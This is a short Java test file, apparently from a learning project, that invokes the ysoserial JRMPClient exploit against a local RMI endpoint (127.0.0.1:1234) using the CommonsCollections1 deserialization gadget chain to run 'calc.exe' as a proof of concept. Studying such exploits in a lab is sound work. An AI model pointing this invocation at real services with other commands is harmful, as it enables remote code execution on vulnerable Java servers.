package org.zzlearn_test.test;

import ysoserial.exploit.*;
import ysoserial.payloads.*;
import ysoserial.payloads.JRMPClient;
import ysoserial.exploit.*;
import ysoserial.payloads.util.PayloadRunner;

public class test {
    public static void main(java.lang.String[] args) throws Exception {
        ysoserial.exploit.JRMPClient.main(new String[]{"127.0.0.1","1234","CommonsCollections1","calc.exe"});
    }
}
